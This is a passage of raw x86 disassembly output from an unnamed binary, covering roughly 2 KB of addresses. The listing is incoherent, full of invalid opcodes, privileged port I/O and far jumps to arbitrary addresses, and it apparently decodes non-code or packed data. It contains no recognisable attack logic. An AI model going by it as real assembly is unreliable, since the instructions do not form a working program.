  406719:	adc    BYTE PTR [edx*8-0x5e37960c],0x61
  406721:	xchg   ecx,eax
  406722:	mov    edi,0x62c0febc
  406727:	jle    0x406749
  406729:	jae    0x4066e2
  40672b:	jmp    0x11664803
  406730:	sbb    ebx,ecx
  406732:	jle    0x4066e8
  406734:	call   DWORD PTR ds:0x55c85811
  40673a:	sbb    edi,edi
  40673c:	and    BYTE PTR [edi],ah
  40673e:	test   eax,0x4d81a60f
  406743:	bound  esp,QWORD PTR [edx+ebx*8-0xf]
  406747:	or     DWORD PTR [edx-0x2a],esi
  40674a:	jo     0x40672b
  40674c:	push   edi
  40674d:	test   dl,ch
  40674f:	mov    ds:0xae977161,eax
  406754:	sbb    DWORD PTR [edx],edx
  406756:	fistp  DWORD PTR [ecx]
  406758:	mov    esi,0xbc38b06a
  40675d:	fwait
  40675e:	mov    eax,DWORD PTR [ebx-0x8]
  406761:	out    0xf2,al
  406763:	or     dh,BYTE PTR [edx]
  406765:	mov    gs,esp
  406767:	dec    esp
  406768:	jl     0x40675c
  40676a:	pop    ebx
  40676b:	in     al,0xa2
  40676d:	aas    
  40676e:	ffree  st(0)
  406770:	dec    DWORD PTR [esi-0x19]
  406773:	sub    esi,edi
  406775:	lea    ebx,[edi+0x2]
  406778:	dec    ecx
  406779:	jmp    0x4067b4
  40677b:	pop    es
  40677c:	jg     0x40675e
  40677e:	inc    ebx
  40677f:	mov    ecx,DWORD PTR [eax+0x5c4fbf68]
  406785:	jmp    0x76eac5db
  40678a:	dec    ebp
  40678b:	ror    BYTE PTR [ebx],cl
  40678d:	out    dx,al
  40678e:	daa    
  40678f:	(bad)  
  406790:	sub    eax,0x238164a4
  406795:	into   
  406796:	dec    ecx
  406797:	sub    cl,al
  406799:	test   eax,0x420242b8
  40679e:	push   es
  40679f:	outs   dx,DWORD PTR ds:[esi]
  4067a0:	nop
  4067a1:	xor    cl,BYTE PTR [ebx]
  4067a3:	scas   eax,DWORD PTR es:[edi]
  4067a4:	gs xchg edi,eax
  4067a6:	jae    0x406823
  4067a8:	inc    ecx
  4067a9:	lea    ebx,[eax-0x4f]
  4067ac:	(bad)  
  4067ad:	and    edi,DWORD PTR [ecx+0x47]
  4067b0:	mov    edx,0xf31ecfe0
  4067b5:	or     al,0x65
  4067b7:	jns    0x4067a9
  4067b9:	xor    DWORD PTR [edx+0x5d],eax
  4067bc:	and    dh,dl
  4067be:	dec    esp
  4067bf:	aam    0x9c
  4067c1:	cld    
  4067c2:	jno    0x406768
  4067c4:	pop    eax
  4067c5:	call   0xcc02949e
  4067ca:	xchg   edi,eax
  4067cb:	cmp    eax,0xa578108d
  4067d0:	xchg   edx,eax
  4067d1:	mov    eax,0x252de55e
  4067d6:	cld    
  4067d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067d8:	add    ebp,ecx
  4067da:	fstp   st(5)
  4067dc:	das    
  4067dd:	rcl    DWORD PTR ds:0xf9a31f19,0x73
  4067e4:	adc    eax,0x7c215ae2
  4067e9:	std    
  4067ea:	jno    0x406785
  4067ec:	lds    ebx,FWORD PTR [esi*4-0x2acec073]
  4067f3:	push   ebp
  4067f4:	mov    BYTE PTR [ebx-0x5889aeab],ah
  4067fa:	sub    al,0x2b
  4067fc:	cdq    
  4067fd:	nop
  4067fe:	int3   
  4067ff:	xor    al,0xa6
  406801:	rcl    BYTE PTR ds:[ecx+0x57],1
  406805:	mov    esp,0x76121649
  40680a:	push   ebx
  40680b:	cwde   
  40680c:	jne    0x4067ca
  40680e:	fwait
  40680f:	into   
  406810:	ins    BYTE PTR es:[edi],dx
  406811:	cmp    BYTE PTR [eax-0x3df07027],al
  406817:	daa    
  406818:	out    dx,eax
  406819:	popa   
  40681a:	fistp  WORD PTR [ebx-0xf]
  40681d:	mov    cl,0xb8
  40681f:	(bad)  
  406820:	std    
  406821:	pusha  
  406822:	xchg   esp,eax
  406823:	push   es
  406824:	or     bl,bl
  406826:	fist   WORD PTR es:[esi]
  406829:	inc    ebp
  40682a:	adc    ah,BYTE PTR ds:0xbb1d74a
  406830:	mov    ds:0xf769436c,eax
  406835:	jge    0x406881
  406837:	lods   al,BYTE PTR ds:[esi]
  406838:	rol    BYTE PTR [ebx],1
  40683a:	xor    BYTE PTR [edi+0x24],cl
  40683d:	test   eax,0x903b7ae4
  406842:	mov    WORD PTR [eax],ds
  406844:	mov    edi,ecx
  406846:	aam    0xe
  406848:	sbb    ah,bh
  40684a:	retf   
  40684b:	push   ecx
  40684c:	(bad)  
  40684e:	sar    BYTE PTR [edi+0x6a],cl
  406851:	sti    
  406852:	rcl    BYTE PTR [ebx],cl
  406854:	fist   WORD PTR [ebp-0x558c4714]
  40685a:	sub    di,di
  40685d:	push   esi
  40685e:	je     0x406849
  406860:	loop   0x4068ca
  406862:	(bad)  
  406863:	ja     0x40687f
  406865:	test   BYTE PTR [esi-0x3b2e8d7],bh
  40686b:	and    bh,BYTE PTR [ebx]
  40686d:	in     al,dx
  40686e:	mov    dh,0xd7
  406870:	cmp    edi,DWORD PTR [ebx-0x74]
  406873:	adc    DWORD PTR [esi-0x730ae574],eax
  406879:	mov    dh,0x66
  40687b:	rcr    BYTE PTR [ecx],1
  40687d:	add    BYTE PTR [eax+0x33],al
  406880:	mov    edx,0xa383694d
  406885:	in     al,dx
  406886:	gs daa 
  406888:	sbb    esi,0x6b
  40688b:	or     cl,ch
  40688d:	jno    0x406905
  40688f:	add    al,0x4e
  406891:	dec    esi
  406892:	lahf   
  406893:	mov    cl,0xb1
  406895:	xor    DWORD PTR [edx-0x74940975],edx
  40689b:	push   cs
  40689c:	stc    
  40689d:	in     al,dx
  40689e:	or     edx,DWORD PTR [esi+0x3c]
  4068a1:	xlat   BYTE PTR ds:[ebx]
  4068a2:	daa    
  4068a3:	call   0xb9e62a4c
  4068a8:	or     al,0xe0
  4068aa:	dec    edx
  4068ab:	xchg   BYTE PTR [ebp+edi*1-0x21e3af5e],cl
  4068b2:	and    al,0x8d
  4068b4:	mov    esi,0xab61725b
  4068b9:	xor    DWORD PTR [ebp+0x4c],edx
  4068bc:	inc    eax
  4068bd:	xor    al,0x83
  4068bf:	push   eax
  4068c0:	outs   dx,BYTE PTR ds:[esi]
  4068c1:	pusha  
  4068c2:	xchg   DWORD PTR [edi],esp
  4068c4:	mov    WORD PTR [ecx+eiz*1+0x5b429f3d],ss
  4068cb:	pop    ecx
  4068cc:	jle    0x4068e6
  4068ce:	sub    BYTE PTR [edx],bl
  4068d0:	(bad)  
  4068d1:	(bad)  
  4068d2:	repz push cs
  4068d4:	outs   dx,DWORD PTR ds:[esi]
  4068d5:	aam    0xda
  4068d7:	add    BYTE PTR [eax+0x5a05e024],dh
  4068dd:	xor    DWORD PTR [ecx],ebp
  4068df:	push   edi
  4068e0:	call   0xbface360
  4068e5:	sbb    DWORD PTR [ecx],ebx
  4068e7:	jne    0x406901
  4068e9:	push   edi
  4068ea:	pop    es
  4068eb:	stos   BYTE PTR es:[edi],al
  4068ec:	cdq    
  4068ed:	mov    ah,0x23
  4068ef:	sti    
  4068f0:	hlt    
  4068f1:	sbb    al,0xe6
  4068f3:	mov    ebp,ds
  4068f5:	sbb    ah,bl
  4068f7:	(bad)  
  4068f8:	pusha  
  4068f9:	pop    ss
  4068fa:	or     al,0x90
  4068fc:	or     ebp,DWORD PTR [ecx+0x37e7c737]
  406902:	and    esp,DWORD PTR [ebx+0x20fad0ce]
  406908:	mov    eax,ds:0x6da5d20
  40690d:	repnz das 
  40690f:	inc    di
  406911:	aam    0xf6
  406913:	js     0x4068ba
  406915:	or     eax,ebx
  406917:	repnz pop ebx
  406919:	sbb    bl,bl
  40691b:	or     al,0x35
  40691d:	xchg   esp,eax
  40691e:	cwde   
  40691f:	cs sahf 
  406921:	mov    dl,0xf6
  406923:	push   ebx
  406924:	xchg   edx,eax
  406925:	or     eax,0x3db27bf6
  40692b:	in     eax,dx
  40692c:	ins    DWORD PTR es:[edi],dx
  40692d:	push   es
  40692e:	or     DWORD PTR [esi+ebx*2],edx
  406931:	cmp    edx,DWORD PTR [ecx]
  406933:	(bad)  
  406934:	and    al,0xe9
  406936:	in     al,dx
  406937:	pop    ds
  406938:	cmc    
  406939:	jge    0x4069b0
  40693b:	mov    esp,0x73f13a82
  406940:	add    eax,0x4cdf3f54
  406945:	fild   QWORD PTR [ebx+0x175ae4c7]
  40694b:	dec    ebx
  40694c:	mov    es,WORD PTR [eax-0x58]
  40694f:	push   esi
  406950:	xor    BYTE PTR [eax+0x4e],0x1d
  406954:	mov    ds:0x48eeeaca,eax
  406959:	or     DWORD PTR [ecx+esi*8],esi
  40695c:	lods   eax,DWORD PTR ds:[esi]
  40695d:	loop   0x4069a9
  40695f:	inc    ecx
  406960:	mov    al,0x73
  406962:	xor    BYTE PTR [ebp+0x76d4c3ed],ah
  406968:	mov    esi,0xc59787bc
  40696d:	shl    DWORD PTR [ebp+0x7bdd2b89],1
  406973:	(bad)  
  406974:	stos   DWORD PTR es:[edi],eax
  406975:	mov    ch,0xe0
  406977:	and    ah,bh
  406979:	jns    0x4069a8
  40697b:	adc    BYTE PTR [ebx+edi*2-0x32],bh
  40697f:	cli    
  406980:	cmp    ecx,DWORD PTR [ebp-0x7f]
  406983:	lock cmp ah,BYTE PTR [ecx-0x1d]
  406987:	or     ah,BYTE PTR [esi+0x35a91d68]
  40698d:	jae    0x4069aa
  40698f:	mov    ebx,0x86858281
  406994:	xor    eax,0x201aca33
  406999:	cdq    
  40699a:	shl    dl,1
  40699c:	xor    DWORD PTR ss:[ebp-0x4d],eax
  4069a0:	fs mov ch,0x3
  4069a3:	shl    DWORD PTR [edx+ecx*8-0x80],1
  4069a7:	mov    al,es:0x7a1ecd0a
  4069ad:	push   ebx
  4069ae:	add    al,0x49
  4069b0:	mov    esi,0xaf21f076
  4069b5:	push   cs
  4069b6:	adc    eax,0x39ccf86f
  4069bb:	aaa    
  4069bc:	sub    DWORD PTR [edx-0x510ffed6],edx
  4069c2:	sub    BYTE PTR [edx],bh
  4069c4:	out    0x2b,eax
  4069c6:	shl    DWORD PTR [esi+esi*4],1
  4069c9:	pop    esp
  4069ca:	adc    DWORD PTR [edx*8+0x7f090f9a],0x27bb0f1d
  4069d5:	jmp    0xd016a536
  4069da:	xor    bl,ah
  4069dc:	dec    esi
  4069dd:	sub    BYTE PTR [ebp-0x26],dl
  4069e0:	push   edx
  4069e1:	fistp  QWORD PTR [ecx+0x1fce4c94]
  4069e7:	and    eax,0x8093d058
  4069ec:	push   ecx
  4069ed:	arpl   WORD PTR [edi],di
  4069ef:	sbb    al,0xf3
  4069f1:	int3   
  4069f2:	and    DWORD PTR [ebx-0x57e183c2],ecx
  4069f8:	sbb    eax,DWORD PTR [ebx]
  4069fa:	mov    eax,ds:0xa533e546
  4069ff:	xchg   esi,eax
  406a00:	inc    ecx
  406a01:	std    
  406a02:	xor    edx,esp
  406a04:	mov    ds:0xdf469e91,eax
  406a09:	sub    eax,0xe76fe923
  406a0e:	fldenv [edi+0x73]
  406a11:	sti    
  406a12:	nop
  406a13:	hlt    
  406a14:	push   cs
  406a15:	fsub   DWORD PTR [esi+0x35]
  406a18:	adc    edi,eax
  406a1a:	iret   
  406a1b:	mov    ds:0x35c11746,al
  406a20:	inc    ebp
  406a21:	add    al,0x7
  406a23:	fwait
  406a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a25:	sbb    al,BYTE PTR [ecx-0x6a]
  406a28:	sbb    eax,0x328af6c0
  406a2d:	stc    
  406a2e:	(bad)  
  406a2f:	in     al,dx
  406a30:	(bad)  
  406a32:	pop    es
  406a33:	jp     0x4069d7
  406a35:	or     al,0xc3
  406a37:	xchg   BYTE PTR [edi+0x2bccfe18],ah
  406a3d:	xchg   esi,eax
  406a3e:	(bad)  
  406a3f:	sub    ebp,DWORD PTR [edx]
  406a41:	fst    DWORD PTR ss:[ebx+0x78]
  406a45:	stc    
  406a46:	(bad)  
  406a47:	adc    al,0x20
  406a49:	dec    edi
  406a4a:	pop    edi
  406a4b:	xor    al,0xe2
  406a4d:	and    eax,0xcaec9681
  406a52:	inc    ebp
  406a53:	test   eax,0x532a9124
  406a58:	mov    ebx,0x47a9b135
  406a5d:	cmp    edi,edi
  406a5f:	mov    DWORD PTR [edi+0xa],ebp
  406a62:	gs mov ebp,0x3ac210da
  406a68:	mov    ebx,0x4932575
  406a6d:	fmul   st,st(1)
  406a6f:	ss inc edi
  406a71:	sti    
  406a72:	sub    BYTE PTR [eax],0xe4
  406a75:	loop   0x406a11
  406a77:	icebp  
  406a78:	pop    esi
  406a79:	jle    0x406a3a
  406a7b:	jl     0x406a15
  406a7d:	jo     0x406a4f
  406a7f:	out    dx,al
  406a80:	(bad)  
  406a81:	adc    al,bl
  406a83:	test   eax,0xc9877aee
  406a88:	sub    ah,al
  406a8a:	je     0x406aed
  406a8c:	fs mov ebp,0x5c0cf408
  406a92:	xor    eax,0x672e825
  406a97:	ins    BYTE PTR es:[edi],dx
  406a98:	ret    
  406a99:	stos   BYTE PTR es:[edi],al
  406a9a:	data16 int 0xac
  406a9d:	push   ecx
  406a9e:	mov    bh,0x59
  406aa0:	fcom   DWORD PTR [ebx+edx*1-0x7b544266]
  406aa7:	cmp    al,BYTE PTR [eax+0x60592470]
  406aad:	pusha  
  406aae:	mov    eax,0x7bf3293f
  406ab3:	aaa    
  406ab4:	fs test BYTE PTR ss:[esi+0x55],ah
  406ab9:	jecxz  0x406b15
  406abb:	xchg   ebp,eax
  406abc:	retf   
  406abd:	je     0x406a43
  406abf:	pop    edx
  406ac0:	xor    bl,ch
  406ac2:	cs stc 
  406ac4:	jne    0x406b34
  406ac6:	push   0xbaf0582
  406acb:	mov    edi,0xe1819ac8
  406ad0:	jno    0xd5694dd3
  406ad6:	cdq    
  406ad7:	inc    ecx
  406ad8:	jo     0x406a84
  406ada:	inc    eax
  406adb:	sub    dh,BYTE PTR [ebx]
  406add:	(bad)  
  406ade:	fiadd  WORD PTR [ecx+eax*4]
  406ae1:	xchg   edx,eax
  406ae2:	xchg   ecx,eax
  406ae3:	adc    al,0xf1
  406ae5:	mov    ah,0xc8
  406ae7:	(bad)  
  406ae8:	cld    
  406ae9:	call   0x1a5f:0xd5867bc1
  406af0:	jmp    0xf4e3:0xbb416dcb
  406af7:	fidiv  WORD PTR es:[eax]
  406afa:	repz cmp BYTE PTR [eax-0x69c670af],dh
  406b01:	sbb    eax,0x2d5caa40
  406b06:	test   eax,0x748f072a
  406b0b:	cmp    DWORD PTR [esi-0x12],esi
  406b0e:	jb     0x406af9
  406b10:	fadd   QWORD PTR [esi]
  406b12:	adc    ecx,DWORD PTR [edi+0x1f]
  406b15:	test   BYTE PTR [ebx-0x7e19c163],dh
  406b1b:	pop    ebp
  406b1c:	push   0xe3a98d61
  406b21:	js     0x406b3c
  406b23:	push   esi
  406b24:	mov    bh,0x57
  406b26:	cmp    edx,DWORD PTR [esi]
  406b28:	mov    ebx,0x8c89b918
  406b2d:	mov    ds:0x7ab4a970,eax
  406b32:	push   ds
  406b33:	daa    
  406b34:	xor    al,0x36
  406b36:	pop    edx
  406b37:	gs (bad) 
  406b39:	stos   BYTE PTR es:[edi],al
  406b3a:	test   eax,0x96f50da6
  406b3f:	push   es
  406b40:	jp     0x406b99
  406b42:	inc    esp
  406b43:	fist   DWORD PTR [ecx-0x78ef492b]
  406b49:	sub    al,0xc2
  406b4b:	cwde   
  406b4c:	adc    BYTE PTR [edi],cl
  406b4e:	jo     0x406b25
  406b50:	pop    ebx
  406b51:	fisub  DWORD PTR [ebx+0x5a]
  406b54:	adc    edi,DWORD PTR [edi-0x1b]
  406b57:	fwait
  406b58:	push   ds
  406b59:	jb     0x406b21
  406b5b:	xchg   BYTE PTR [eax-0x35324e1f],bh
  406b61:	or     bh,cl
  406b63:	jge    0x406af5
  406b65:	inc    eax
  406b66:	aaa    
  406b67:	aas    
  406b68:	cmp    BYTE PTR [esp+ebx*4-0x11f247aa],0xa4
  406b70:	pop    ebx
  406b71:	pop    edx
  406b72:	sub    al,0xa8
  406b74:	std    
  406b75:	sbb    ecx,ecx
  406b77:	jmp    0xa6ed14d5
  406b7c:	jecxz  0x406b5d
  406b7e:	and    al,BYTE PTR [esp+esi*2-0x2c]
  406b82:	xor    ah,BYTE PTR ds:0x9bb05208
  406b88:	das    
  406b89:	cmp    cl,ah
  406b8b:	clc    
  406b8c:	mov    cl,0x8b
  406b8e:	fist   DWORD PTR [edi+esi*1+0xdaf574a]
  406b95:	(bad)  
  406b96:	cdq    
  406b97:	lods   al,BYTE PTR ds:[esi]
  406b98:	pop    es
  406b99:	or     DWORD PTR [ebp+0x7ca57e5],0xfe9f9393
  406ba3:	xchg   ebx,eax
  406ba4:	adc    BYTE PTR [eax+eiz*4-0x4a],bh
  406ba8:	dec    esi
  406ba9:	add    eax,0xef79a11b
  406bae:	mov    WORD PTR [edi+0x15a1aa05],cs
  406bb4:	push   0x3849668d
  406bb9:	shr    DWORD PTR [edx],0x74
  406bbc:	cmc    
  406bbd:	inc    eax
  406bbe:	gs xchg ecx,eax
  406bc0:	sbb    edi,DWORD PTR [ebp-0x3c]
  406bc3:	mov    ecx,0x93e76a48
  406bc8:	or     ecx,DWORD PTR [ebp-0x6e8ba2f5]
  406bce:	sub    BYTE PTR [edx-0x16],bl
  406bd1:	pop    edx
  406bd2:	jp     0x406c1e
  406bd4:	out    dx,al
  406bd5:	jno    0x406b63
  406bd7:	popw   es
  406bd9:	add    al,0xc8
  406bdb:	dec    ebx
  406bdc:	jae    0x406bb8
  406bde:	lods   eax,DWORD PTR ds:[esi]
  406bdf:	pusha  
  406be0:	outs   dx,BYTE PTR ds:[esi]
  406be1:	pop    ds
  406be2:	sbb    al,BYTE PTR [edx+0x1ae77a3c]
  406be8:	mov    cl,0xd6
  406bea:	sbb    dh,BYTE PTR [ebp+0x39]
  406bed:	mov    ecx,0x9c66033f
  406bf2:	or     DWORD PTR [edx+0x58],esp
  406bf5:	add    BYTE PTR [edx+0x727bb256],0xc5
  406bfc:	retf   0x6400
  406bff:	jmp    DWORD PTR [esi]
  406c01:	pusha  
  406c02:	(bad)  
  406c03:	imul   ecx,DWORD PTR [ebx-0x2e],0xffffffe5
  406c07:	sbb    eax,DWORD PTR [ebp+0x3]
  406c0a:	or     eax,0x2a7599ca
  406c0f:	pop    edx
  406c10:	sub    al,0x9b
  406c12:	jg     0x406c7d
  406c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c15:	mov    ebx,0xb1b71960
  406c1a:	loop   0x406bfa
  406c1c:	in     eax,dx
  406c1d:	lahf   
  406c1e:	or     dh,cl
  406c20:	lods   eax,DWORD PTR ds:[esi]
  406c21:	(bad)  
  406c22:	cdq    
  406c23:	xchg   edx,eax
  406c24:	call   0xe89c:0x29b7c126
  406c2b:	aad    0x39
  406c2d:	fstp   TBYTE PTR [ebp-0xb]
  406c30:	xor    dh,BYTE PTR ds:0xe287b7c9
  406c36:	mov    esp,0xb0fadd7
  406c3b:	out    dx,eax
  406c3c:	xor    eax,ecx
  406c3e:	nop
  406c3f:	int3   
  406c40:	mov    cl,0x8c
  406c42:	jae    0x406c22
  406c44:	add    edx,DWORD PTR [ebp+0x7a]
  406c47:	xchg   ebx,eax
  406c48:	lea    ebx,[ecx]
  406c4a:	dec    esi
  406c4b:	mov    ?,edx
  406c4d:	dec    edx
  406c4e:	ins    DWORD PTR es:[edi],dx
  406c4f:	mov    ch,0xc6
  406c51:	int    0x10
  406c53:	add    BYTE PTR [esi-0x7fab4e95],dh
  406c59:	ss pop eax
  406c5b:	push   es
  406c5c:	(bad)  
  406c5d:	iretw  
  406c5f:	inc    esp
  406c60:	and    al,BYTE PTR [ecx+0x5a]
  406c63:	add    esp,edi
  406c65:	clc    
  406c66:	add    esi,DWORD PTR [edi]
  406c68:	pop    ecx
  406c69:	stc    
  406c6a:	add    ebx,DWORD PTR [ecx-0x77]
  406c6d:	loope  0x406c93
  406c6f:	addr16 (bad) 
  406c71:	mov    esp,0xd5133837
  406c76:	aas    
  406c77:	lock push 0xb6559246
  406c7d:	xchg   ecx,eax
  406c7e:	adc    ebx,DWORD PTR [edx-0x1552c1bb]
  406c84:	push   ds
  406c85:	jb     0x406ca9
  406c87:	dec    ebp
  406c88:	jmp    0x4a8f:0x7d6421b2
  406c8f:	sbb    DWORD PTR [edi],0x70
  406c92:	xchg   esp,eax
  406c93:	dec    esi
  406c94:	sub    BYTE PTR [ebx-0x4],ch
  406c97:	scas   al,BYTE PTR es:[edi]
  406c98:	shl    DWORD PTR [ebx+0x148c3f50],cl
  406c9e:	js     0x406c37
  406ca0:	push   edx
  406ca1:	retf   0x6994
  406ca4:	jle    0x406cb7
  406ca6:	ins    BYTE PTR es:[edi],dx
  406ca7:	(bad)  
  406ca8:	gs fcmove st,st(3)
  406cab:	inc    ecx
  406cac:	dec    esi
  406cad:	mov    ecx,0xa50ff1bb
  406cb2:	imul   esp,eax,0x6dc0ba95
  406cb8:	outs   dx,BYTE PTR ds:[esi]
  406cb9:	dec    esi
  406cba:	fist   DWORD PTR [ebx]
  406cbc:	push   0xffffffb1
  406cbe:	add    eax,0x27100cb6
  406cc3:	xor    al,0xe0
  406cc5:	repz push cs
  406cc7:	jmp    0xe595:0xd02c59fa
  406cce:	mov    ch,0x76
  406cd0:	shl    esp,0x4c
  406cd3:	cmp    eax,0x48979340
  406cd8:	mov    edi,DWORD PTR [ebx]
  406cda:	popf   
  406cdb:	adc    eax,0xbab8ef38
  406ce0:	test   al,0xbb
  406ce2:	xchg   DWORD PTR [esi-0x5],edi
  406ce5:	push   ds
  406ce6:	sahf   
  406ce7:	xchg   ecx,eax
  406ce8:	js     0x406cf2
  406cea:	jmp    DWORD PTR [ebx+edx*4]
  406ced:	dec    ebp
  406cee:	adc    edi,esi
  406cf0:	xchg   esp,eax
  406cf1:	mov    ch,0xce
  406cf3:	stos   DWORD PTR es:[edi],eax
  406cf4:	mov    WORD PTR [eax+0x6f24ee2c],es
  406cfa:	aad    0x16
  406cfc:	sti    
  406cfd:	or     dh,BYTE PTR [esi+0x740c6181]
  406d03:	outs   dx,BYTE PTR ds:[esi]
  406d04:	aam    0xe3
  406d06:	push   eax
  406d07:	sbb    al,0x1f
  406d09:	pop    ds
  406d0a:	ins    DWORD PTR es:[edi],dx
  406d0b:	jo     0x406cd9
  406d0d:	ja     0x406d1d
  406d0f:	jle    0x406d61
  406d11:	jae    0x406cd2
  406d13:	sbb    ah,bl
  406d15:	aam    0xb7
  406d17:	outs   dx,DWORD PTR ds:[esi]
  406d18:	dec    eax
  406d19:	int3   
  406d1a:	fild   QWORD PTR [eax]
  406d1c:	nop
  406d1d:	mov    ds:0xd7f3736,eax
  406d22:	and    eax,0xe318bc01
  406d27:	inc    esp
  406d28:	dec    edx
  406d29:	sbb    DWORD PTR [edx],edi
  406d2b:	pop    ss
  406d2c:	inc    eax
  406d2d:	jbe    0x406d69
  406d2f:	or     dl,cl
  406d31:	jmp    0x406cbe
  406d33:	xor    BYTE PTR [esi-0x3b],0xcb
  406d37:	add    al,0xf8
  406d39:	xor    ah,BYTE PTR [edi+eiz*4-0x6f7ea9fb]
  406d40:	jns    0x406cf7
  406d42:	pop    ss
  406d43:	dec    ecx
  406d44:	adc    edi,DWORD PTR [ebp-0x1dcab090]
  406d4a:	inc    eax
  406d4b:	test   BYTE PTR [eax+0x18a281fe],0x7f
  406d52:	dec    esp
  406d53:	sbb    eax,0x3ac174b9
  406d58:	shl    BYTE PTR [edi-0x4fe309b0],1
  406d5e:	jl     0x406dad
  406d60:	sar    ebp,cl
  406d62:	xchg   BYTE PTR [ecx+ecx*1-0x4b],ch
  406d66:	sahf   
  406d67:	push   edx
  406d68:	scas   al,BYTE PTR es:[edi]
  406d69:	int3   
  406d6a:	fstp   DWORD PTR [edx]
  406d6c:	pop    ebx
  406d6d:	ja     0x406dd9
  406d6f:	in     al,dx
  406d70:	dec    ecx
  406d71:	das    
  406d72:	cmc    
  406d73:	cmp    ecx,eax
  406d75:	lds    esp,FWORD PTR ds:[edi+0x51]
  406d79:	retf   0xd63b
  406d7c:	or     bh,BYTE PTR [edi+0x7d681283]
  406d82:	cli    
  406d83:	jo     0x406db9
  406d85:	cs rep stos DWORD PTR es:[edi],eax
  406d88:	sub    DWORD PTR [ebp-0x74e11027],0xfa9a4244
  406d92:	push   edi
  406d93:	int3   
  406d94:	fsubr  QWORD PTR [ecx+0x2c12eb67]
  406d9a:	inc    esi
  406d9b:	loope  0x406e15
  406d9d:	stc    
  406d9e:	pushf  
  406d9f:	daa    
  406da0:	stos   DWORD PTR es:[edi],eax
  406da1:	je     0x406db5
  406da3:	iret   
  406da4:	retf   
  406da5:	aas    
  406da6:	add    al,0x1a
  406da8:	inc    ecx
  406da9:	mov    ebx,0x31695531
  406dae:	jmp    0xacc5:0x2ebacefa
  406db5:	sub    eax,0xae59fd02
  406dba:	mov    bl,0xfc
  406dbc:	cmp    BYTE PTR [ebx],bh
  406dbe:	sbb    BYTE PTR [edi+0x27],dl
  406dc1:	retf   
  406dc2:	(bad)  
  406dc3:	hlt    
  406dc4:	neg    DWORD PTR [ecx]
  406dc6:	shl    ebp,cl
  406dc8:	sub    BYTE PTR [edx],bh
  406dca:	ins    DWORD PTR es:[edi],dx
  406dcb:	(bad)  
  406dcd:	shl    DWORD PTR [ecx-0x3ca761c3],0x20
  406dd4:	push   ss
  406dd5:	loopne 0x406df5
  406dd7:	inc    esi
  406dd8:	shl    BYTE PTR [ebp-0x6a782e16],1
  406dde:	or     DWORD PTR [ecx+0x479e0a1b],eax
  406de4:	popa   
  406de5:	xor    DWORD PTR [ebp-0x78],ebp
  406de8:	sub    dl,BYTE PTR [ebx]
  406dea:	mov    dh,0x76
  406dec:	sub    al,0x81
  406dee:	mov    WORD PTR [edx],cs
  406df0:	ret    
  406df1:	push   edx
  406df2:	int    0x20
  406df4:	test   DWORD PTR [ebp-0x46319d87],esp
  406dfa:	stos   DWORD PTR es:[edi],eax
  406dfb:	cmp    BYTE PTR [edi+0x1b],0xfb
  406dff:	mov    edx,0x5a48a47a
  406e04:	fucom  st(1)
  406e06:	mov    cl,0x31
  406e08:	sbb    eax,0xcdef60
  406e0d:	sub    ecx,DWORD PTR [edx-0x5f]
  406e10:	rcr    edi,cl
  406e12:	jle    0x406da8
  406e14:	aam    0x45
  406e16:	push   esi
  406e17:	and    eax,0xc20afa9d
  406e1c:	mov    WORD PTR [edi],?
  406e1e:	push   0xf91a9988
  406e23:	dec    esp
  406e24:	dec    ebp
  406e25:	xor    al,0xfb
  406e27:	mov    cl,0x2e
  406e29:	xchg   esi,eax
  406e2a:	cmp    bl,bh
  406e2c:	test   BYTE PTR [bx+si],bl
  406e2f:	loope  0x406dbb
  406e31:	cmp    eax,0x50ac3f9d
  406e36:	loope  0x406e80
  406e38:	mov    eax,ds:0xf7c71d23
  406e3d:	push   ds
  406e3e:	push   0xfffffff6
  406e40:	(bad)  
  406e43:	fiadd  WORD PTR [ecx+0x17]
  406e46:	jno    0x406e01
  406e48:	out    0x60,eax
  406e4a:	cli    
  406e4b:	add    DWORD PTR [edx+edi*4],edi
  406e4e:	mov    edi,0x8eee0530
  406e53:	adc    al,bh
  406e55:	sub    al,bh
  406e57:	nop
  406e58:	push   esp
  406e59:	dec    eax
  406e5a:	test   BYTE PTR [ecx],al
  406e5c:	mov    eax,ds:0x39cd1c40
  406e61:	mov    eax,0xb23ca456
  406e66:	xchg   esp,eax
  406e67:	outs   dx,DWORD PTR ds:[esi]
  406e68:	cmp    ebx,esi
  406e6a:	in     eax,dx
  406e6b:	ror    BYTE PTR [ebx],1
  406e6d:	mov    DWORD PTR [eax],ebx
  406e6f:	jl     0x406dfa
  406e71:	jmp    0x957317ad
  406e76:	mov    esi,0xf7afbb4f
  406e7b:	pop    eax
  406e7c:	push   ebx
  406e7d:	popa   
  406e7e:	arpl   WORD PTR [ecx+0x76],ax
  406e81:	push   esi
  406e82:	aad    0xc3
  406e84:	imul   ecx,DWORD PTR [esi],0x0
  406e87:	out    0xd4,eax
  406e89:	push   0xaf16a5fa
  406e8e:	(bad)  
  406e8f:	jb     0x406ea0
  406e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e92:	cmc    
  406e93:	les    ecx,FWORD PTR [edi+0x4601ed10]
  406e99:	sbb    esp,edx
  406e9b:	mov    dh,0x1f
  406e9d:	pusha  
  406e9e:	fisttp DWORD PTR [eax]
  406ea0:	ss dec edx
  406ea2:	inc    eax
  406ea3:	pop    es
  406ea4:	push   ds
  406ea5:	mov    eax,DWORD PTR [esi+0x5b0779de]
  406eab:	pop    ss
  406eac:	and    ah,BYTE PTR [ecx+0x45ffb53f]
  406eb2:	and    bl,cl
  406eb4:	mov    edx,0x27417299
  406eb9:	mov    DWORD PTR [ebx-0x55],eax
  406ebc:	and    eax,DWORD PTR [edx]
  406ebe:	pop    es
  406ebf:	fs out dx,al
  406ec1:	xchg   esi,eax
  406ec2:	cmp    eax,0xb947c8dc
  406ec7:	sti    
  406ec8:	jge    0x406f2a
  406eca:	call   0x4432:0xeaad7d35
  406ed1:	or     eax,ecx
  406ed3:	lds    esi,FWORD PTR [ebx-0x1e]
  406ed6:	ret    0xadd1
  406ed9:	push   ecx
  406eda:	sti    
  406edb:	scas   al,BYTE PTR es:[edi]
  406edc:	or     DWORD PTR [ebx-0x2],esi
  406edf:	sub    ebp,ebp
  406ee1:	jl     0x406f42
  406ee3:	in     al,dx
  406ee4:	and    DWORD PTR [edx],edx
  406ee6:	xchg   edx,eax
  406ee7:	mov    WORD PTR [edx],gs
  406ee9:	cli    
  406eea:	out    dx,al
